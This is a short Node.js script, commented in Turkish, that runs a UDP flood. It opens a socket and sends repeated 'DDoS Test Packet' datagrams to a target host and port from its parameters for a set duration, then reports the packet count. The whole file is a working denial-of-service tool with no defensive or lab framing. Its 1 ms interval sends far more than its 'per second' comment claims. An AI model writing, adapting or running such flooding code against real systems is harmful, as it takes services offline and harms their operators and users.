// udp_flood.js - BASİT VERSİYON
const dgram = require('dgram');

// TEK socket
const client = dgram.createSocket('udp4');
const message = Buffer.from('DDoS Test Packet');

const startTime = Date.now();
const duration = params.duration * 1000;
const requestsPerSecond = params.requests || 100;

console.log(`[+] UDP Flood başladı: ${params.target}:${params.port}`);

let sentCount = 0;
let interval = setInterval(() => {
    // Her saniye requestsPerSecond kadar paket gönder
    for (let i = 0; i < requestsPerSecond; i++) {
        client.send(message, params.port, params.target, (err) => {
            if (!err) sentCount++;
        });
    }
}, 1); // 1ms aralıklarla (aslında her event loop'da)

// Süre sonunda dur
setTimeout(() => {
    clearInterval(interval);
    client.close();
    console.log(`[+] UDP Flood bitti: ${sentCount} paket`);
}, duration);
